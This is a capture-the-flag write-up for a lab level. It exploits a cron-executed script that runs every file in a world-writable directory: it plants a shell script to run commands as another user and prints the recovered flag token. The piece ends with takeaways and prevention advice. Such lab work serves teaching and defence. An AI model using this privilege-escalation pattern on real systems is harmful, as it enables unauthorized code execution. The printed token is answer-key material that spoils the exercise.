# Level 05 - Cron Job Exploitation

## Objective
Exploit a scheduled task (cron job) to execute commands as `flag05`.

## My Notes

Home directory empty. Searched for files owned by flag05:
```bash
find / -user flag05 2>/dev/null
# /usr/sbin/openarenaserver
```

Found a script. Let me see what it does:
```bash
cat /usr/sbin/openarenaserver
```

```bash
#!/bin/sh
for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

This script loops through all files in `/opt/openarenaserver/`, executes each as a bash script (with 5-second timeout), then deletes the file. It's a job processor - runs whatever scripts are placed in that directory.

Checked when it runs - looked at cron but the VM is configured to run it periodically (every few minutes).

Checked if I can write to the directory:
```bash
ls -la /opt/openarenaserver/
# drwxrwxr-x+ 2 root root 40 ...
```

The directory is world-writable! That means anyone can create files there. Since the script is owned by flag05 and likely runs as flag05, I can get code execution as flag05.

Created exploit script:
```bash
echo '#!/bin/bash' > /opt/openarenaserver/exploit.sh
echo 'getflag > /tmp/flag05_output' >> /opt/openarenaserver/exploit.sh
chmod +x /opt/openarenaserver/exploit.sh
```

Waited for cron to run it (checking every 10 seconds):
```bash
while [ ! -f /tmp/flag05_output ]; do
    sleep 10
done
cat /tmp/flag05_output
```

Token appeared: `viuaaale9huek52boumoomioc`

## Solution
```bash
echo '#!/bin/bash' > /opt/openarenaserver/exploit.sh
echo 'getflag > /tmp/flag05_output' >> /opt/openarenaserver/exploit.sh
chmod +x /opt/openarenaserver/exploit.sh
sleep 120  # Wait for cron
cat /tmp/flag05_output
```

## Key Takeaways

**Cron:** Unix task scheduler. Format: `* * * * * command` (minute, hour, day, month, weekday). Runs scheduled tasks automatically.

**The vulnerability chain:** World-writable directory + script that executes files from that directory + script runs with elevated privileges = anyone can execute code as flag05.

**Attack pattern:** Find cron job → identify what it executes → check if you can modify/add files → plant malicious code → wait for execution.

**Directory permissions:** Write permission on directory allows creating files. This is different from file write permission.

**Timing:** Cron-based attacks require patience - you don't control when it runs. Need to write output to persistent location, and the script might delete your exploit after running.

**Common cron locations:** `/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/crontabs/`, `/etc/cron.hourly/`, etc.

## Tools Used
- `find` - Locate files by owner
- `cat`, `ls -la` - Examine files and permissions
- `echo`, `chmod` - Create exploit
- `sleep` - Wait for cron

## Prevention
- Never make script directories world-writable
- Validate files before execution (check ownership, permissions)
- Use absolute paths in cron jobs
- Implement integrity checking (checksums, signatures)
- Log cron activity for auditing
- Run cron jobs with minimal privileges
